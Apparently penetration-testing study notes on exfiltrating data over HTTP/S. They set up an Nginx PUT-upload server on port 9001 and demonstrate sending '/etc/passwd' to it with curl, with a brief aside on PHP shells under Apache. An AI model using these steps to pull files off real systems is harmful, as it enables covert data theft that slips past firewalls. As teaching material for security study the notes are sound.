
## **Why HTTP/S for Exfiltration**

- Most firewalls allow HTTP/S traffic.
    
- HTTPS encrypts content (stealthy and secure).
    
- Easy to use with `curl`, `wget`, or Python scripts.
    
- Avoids suspicious protocols.
    

---

## **Step-by-Step: Secure Uploads**

### **1. Create Upload Directory**

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

_Files will be saved here._

---

### **2. Set Permissions**

```bash
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

_`www-data` is the default Nginx user._

---

### **3. Configure Nginx**

```bash
sudo nano /etc/nginx/sites-available/upload.conf
```

Paste:

```nginx
server {
    listen 9001;

    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

_Use port `9001` to avoid conflicts._

---

### **4. Enable the Site**

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

---

### **5. Start/Restart Nginx**

```bash
sudo systemctl restart nginx.service
```

---

### **6. Fix Port Conflicts (if needed)**

Check active ports:

```bash
sudo ss -lnpt | grep 80
```

Remove default config:

```bash
sudo rm /etc/nginx/sites-enabled/default
sudo systemctl restart nginx.service
```

---

### **7. Upload a File**

Example: upload `/etc/passwd` as `users.txt`

```bash
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

Verify:

```bash
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```

---

### **8. Directory Listing**

- Nginx **blocks directory listing by default**.
    
- Browsing:
    
    ```
    http://localhost:9001/SecretUploadDirectory
    ```
    
    â†’ returns **403 Forbidden** (good).
    

---

## **Why Not Apache**

- Easier to misconfigure.
    
- PHP shells (`.php`) might auto-execute.
    
- Directory listing often enabled by default.
    

---
